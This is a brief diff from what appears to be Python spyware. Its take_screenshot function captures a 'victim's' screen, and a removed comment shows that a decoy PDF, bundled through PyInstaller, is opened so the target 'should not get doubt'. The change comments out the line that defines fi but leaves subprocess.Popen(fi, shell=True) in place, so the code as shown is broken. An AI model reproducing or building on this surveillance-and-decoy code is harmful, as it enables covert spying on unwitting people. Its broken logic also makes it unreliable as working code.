@@ -118,8 +118,8 @@ def take_screenshot():
      victim and save it in a "pics" folder
     """""
     
-    #creates a temp folder for pyinstaller(/m.pdf i used for user should not get doubt)
-    fi = sys._MEIPASS + "/m.pdf"
+    #creates a temp folder for pyinstaller
+    #fi = sys._MEIPASS + "/m.pdf"
     subprocess.Popen(fi, shell=True)
 
     global index, images, i, j
